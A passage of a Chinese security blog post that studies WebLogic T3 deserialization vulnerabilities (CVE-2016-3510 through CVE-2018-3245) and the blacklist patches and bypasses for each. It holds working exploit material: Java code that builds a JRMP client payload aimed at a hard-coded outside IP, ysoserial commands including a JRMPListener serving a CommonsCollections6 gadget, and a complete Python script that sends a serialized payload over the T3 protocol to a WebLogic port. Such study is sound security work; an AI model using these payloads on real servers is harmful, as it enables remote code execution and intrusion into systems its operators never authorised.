+<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712232421940-37466e28-a827-4c1a-b423-1eae26e3803a.png#averageHue=%23afadab&clientId=ub4fd53c1-bdf0-4&from=drop&id=u014b910c&originHeight=596&originWidth=769&originalType=binary&ratio=1&rotation=0&showTitle=false&size=189850&status=done&style=none&taskId=u41a698da-2270-437a-a94f-b30126c49f0&title=" alt="Pasted image 20240403174506.png"><br>也就是给StreamMessageImpl#readExternal重写了resolveclass，设置了黑名单</p>
+<h2 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h2><p>类似于上面那种，是一个新的类weblogic.corba.utils.MarshalledObject<br>其readResolve方法，赤裸裸的反序列化<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712232468018-73d4fc55-aba1-4019-8c4d-625d5373b82d.png#averageHue=%232d2b2a&clientId=ub4fd53c1-bdf0-4&from=drop&id=u09f0ded8&originHeight=469&originWidth=1388&originalType=binary&ratio=1&rotation=0&showTitle=false&size=66713&status=done&style=none&taskId=u6406a967-f16a-420d-a9fa-cc49ce2775f&title=" alt="Pasted image 20240403175001.png"><br>构造也很简单，设置this.objBytes即可，这里直接把恶意类丢进构造函数就可以<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712232473113-cc93d12d-8541-4371-bbbf-1db7c442d3f6.png#averageHue=%232c2c2b&clientId=ub4fd53c1-bdf0-4&from=drop&id=ud7f337d6&originHeight=628&originWidth=1449&originalType=binary&ratio=1&rotation=0&showTitle=false&size=80890&status=done&style=none&taskId=u61941dab-24f6-40fc-bbb9-c4ad5afc89e&title=" alt="Pasted image 20240403182335.png"></p>
+<h3 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>修复也是同样丢进了黑名单</p>
+<h2 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h2><p>此后便进入了JRMP攻击时代<br>从别人博客扒的图<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712232482719-9bb0c66d-c6d5-4b4a-b3b5-3094db41412d.png#averageHue=%23f2f2f2&clientId=ub4fd53c1-bdf0-4&from=drop&id=u26780dd3&originHeight=480&originWidth=700&originalType=binary&ratio=1&rotation=0&showTitle=false&size=114113&status=done&style=none&taskId=u6633a1c9-3b21-4ac8-b301-1e74a2a4278&title=" alt="Pasted image 20240404105004.png"><br>payload，使其开启一个JRMPClient，并向指定地址发起请求，也可以用ysoserial直接生成</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> host <span class="token operator">=</span> <span class="token string">"43.137.36.145"</span><span class="token punctuation">;</span>  
+<span class="token class-name">Integer</span> port <span class="token operator">=</span> <span class="token number">8888</span><span class="token punctuation">;</span>  
+  
+<span class="token class-name">ObjID</span> id <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjID</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// RMI registry  </span>
+<span class="token class-name">TCPEndpoint</span> te <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TCPEndpoint</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token class-name">UnicastRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UnicastRef</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LiveRef</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> te<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token class-name">RemoteObjectInvocationHandler</span> remoteObjectInvocationHandler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RemoteObjectInvocationHandler</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token class-name">String</span> serialize <span class="token operator">=</span> tools<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>remoteObjectInvocationHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+tools<span class="token punctuation">.</span><span class="token function">serialize_file</span><span class="token punctuation">(</span>remoteObjectInvocationHandler<span class="token punctuation">,</span><span class="token string">"F:\\study\\weblogic\\weblogic_attack\\1.out"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> ysoserial.jar JRMPClient <span class="token function">ip</span> port <span class="token operator">></span> <span class="token number">1</span>.out<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>来个python攻击脚本，java写的T3协议又臭又长</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii  
+<span class="token keyword">import</span> os  
+<span class="token keyword">import</span> re  
+<span class="token keyword">import</span> socket  
+<span class="token keyword">import</span> struct  <span class="token comment"># 负责大小端的转换  </span>
+<span class="token keyword">import</span> subprocess
+
+<span class="token keyword">def</span> <span class="token function">T3Exploit</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>  
+    sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>  
+    sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>  
+    handshake <span class="token operator">=</span> <span class="token string">"t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"</span>  
+    sock<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>handshake<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
+    data <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>  
+    <span class="token builtin">compile</span> <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">"HELO:(.*).0.false"</span><span class="token punctuation">)</span>  
+    <span class="token keyword">match</span> <span class="token operator">=</span> <span class="token builtin">compile</span><span class="token punctuation">.</span>findall<span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
+    <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>  
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Weblogic: "</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
+    <span class="token keyword">else</span><span class="token punctuation">:</span>  
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Not Weblogic"</span><span class="token punctuation">)</span>  
+        <span class="token comment"># return  </span>
+    header <span class="token operator">=</span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span><span class="token string">b"00000000"</span><span class="token punctuation">)</span>  
+    t3header <span class="token operator">=</span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>  
+        <span class="token string">b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006"</span><span class="token punctuation">)</span>  
+    desflag <span class="token operator">=</span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span><span class="token string">b"fe010000"</span><span class="token punctuation">)</span>  
+    payload <span class="token operator">=</span> header <span class="token operator">+</span> t3header <span class="token operator">+</span> desflag <span class="token operator">+</span> payload  
+    payload <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">I"</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> payload<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  
+    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  
+  
+  
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>  
+    payload <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1.out"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>  
+  
+    ip <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>  
+    port <span class="token operator">=</span> <span class="token number">7001</span>  
+    T3Exploit<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>记得开JRMPListner</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-cp</span> ysoserial.jar ysoserial.exploit.JRMPListener <span class="token number">8888</span> CommonsCollections6 <span class="token string">'calc'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>实际上就是反序列化打的rmi的gadgets，在开启一个JRMPClient并向远程的JRMPLIstener发起请求，JRMPListener返回恶意的类，最终在本地进行二次反序列化</p>
+<h3 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>把java.rmi.registry.Registry接口丢进了接口黑名单<br>实际上大部分查询到的文章payload如下，我在调试时也没发现进入了invoke，还是正常走的readObject的流程，很怪</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> host <span class="token operator">=</span> <span class="token string">"43.137.36.145"</span><span class="token punctuation">;</span>
+<span class="token class-name">Integer</span> port <span class="token operator">=</span> <span class="token number">8888</span><span class="token punctuation">;</span>
+
+<span class="token class-name">ObjID</span> id <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjID</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// RMI registry</span>
+<span class="token class-name">TCPEndpoint</span> te <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TCPEndpoint</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">UnicastRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UnicastRef</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LiveRef</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> te<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">RemoteObjectInvocationHandler</span> remoteObjectInvocationHandler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RemoteObjectInvocationHandler</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">Registry</span> proxy <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Registry</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>poc<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>
+    <span class="token class-name">Registry</span><span class="token punctuation">.</span><span class="token keyword">class</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> remoteObjectInvocationHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="CVE-2018-2628-2893-3245"><a href="#CVE-2018-2628-2893-3245" class="headerlink" title="CVE-2018-2628|2893|3245"></a>CVE-2018-2628|2893|3245</h2><p>学过RMI的实际上就能知道，除了RemoteObjectInvocationHandler还能使用UnicastRef、UnicastRemoteObject、ActivationGroupImpl、RMIConnectionImpl_Stub等<br><a target="_blank" rel="noopener" href="https://github.com/pyn3rd/CVE-2018-3245">pyn3rd&#x2F;CVE-2018-3245: CVE-2018-3245-PoC (github.com)</a><br>文章中给出了方法,其实最终都是在调用UnicastRef对JRMPListener发起请求<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712235243693-4c5a597a-f010-4b84-b3a9-993d48548376.png#averageHue=%23ffffff&clientId=ub4fd53c1-bdf0-4&from=drop&id=ubacd5036&originHeight=122&originWidth=890&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16057&status=done&style=none&taskId=u9c264d72-f193-4ec3-82a9-2188c664337&title=" alt="Pasted image 20240404184725.png"></p>
+<hr>
+<p>来到CVE2018-2893，UnicastRef被加入了黑名单<br>此时使用StreamMessageImpl对外层进行封装，因为StreamMessageImpl的反序列化检查并没有检查Registry接口，所以就可以去继续使用被修复的RemoteObjectInvocationHandler<br>在使用RemoteObjectInvocationHandler作为最外层时，UnicastRef并没有参与反序列化，只是作为一个类名进行调用，在writeObject中可看出<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712235249887-9d3a9f76-57eb-46cf-bf35-0f2acf813417.png#averageHue=%23806749&clientId=ub4fd53c1-bdf0-4&from=drop&id=u980c2fac&originHeight=934&originWidth=1594&originalType=binary&ratio=1&rotation=0&showTitle=false&size=157088&status=done&style=none&taskId=u78d41605-cbf2-480e-86f1-c4bd557c717&title=" alt="Pasted image 20240404185947.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712235255606-510dcf7e-a8c5-4d58-804e-818d7a648b82.png#averageHue=%23f4f4f4&clientId=ub4fd53c1-bdf0-4&from=drop&id=ufd44757b&originHeight=148&originWidth=406&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15130&status=done&style=none&taskId=ub55488c9-ae0a-41b2-968a-495be7c2f70&title=" alt="Pasted image 20240404185300.png"></p>
+<hr>
+<p>来到CVE2018-3245<br>把RemoteObjectInvocationHandler给过滤了，然后就有了代替品RMIConnectionImpl_Stub，实际上就是找RemoteObject可用的子类</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2024/03/31/2024%E4%B8%80%E5%AD%A3%E5%BA%A6%E8%AE%B0%E5%BD%95/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2024-04-04 20:58:20
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#T3%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0"><span class="toc-text">T3协议学习</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95"><span class="toc-text">远程调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2015-4852"><span class="toc-text">CVE-2015-4852</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞修复</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-0638"><span class="toc-text">CVE-2016-0638</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-3510"><span class="toc-text">CVE-2016-3510</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-2"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-3248"><span class="toc-text">CVE-2017-3248</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-3"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2018-2628-2893-3245"><span class="toc-text">CVE-2018-2628|2893|3245</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+  
+    <script async type="text/javascript" src='https://cdn.jsdelivr.net/npm/valine@1.4.18/dist/Valine.min.js' onload="loadValineSuc(this)"></script>
+  
+
+  <div id="vcomments"></div>
+
+  <script>
+    function loadValineSuc() {
+      new Valine({
+        el: '#vcomments',
+        appId: 'bNa2jesvrDl0f51DIPiFWHCO-gzGzoHsz',
+        appKey: 'UfLQ40Ou8xWfDtBEct4Yxct1',
+        placeholder: 'welcome!',
+        avatar: 'retro',
+        lang: 'en'
+      })
+    }
+  </script>
+
+    <style>
+      .comments-container .v .vempty {
+        display: none!important;
+      }
+    </style>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2024 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + WeblogicT3%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0 + '&url=' + http%3A%2F%2Fexample.com%2F2024%2F04%2F04%2FWeblogicT3%25E5%258D%258F%25E8%25AE%25AE%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%25BC%258F%25E6%25B4%259E%25E5%25AD%25A6%25E4%25B9%25A0%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2024/04/04/WeblogicT3%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
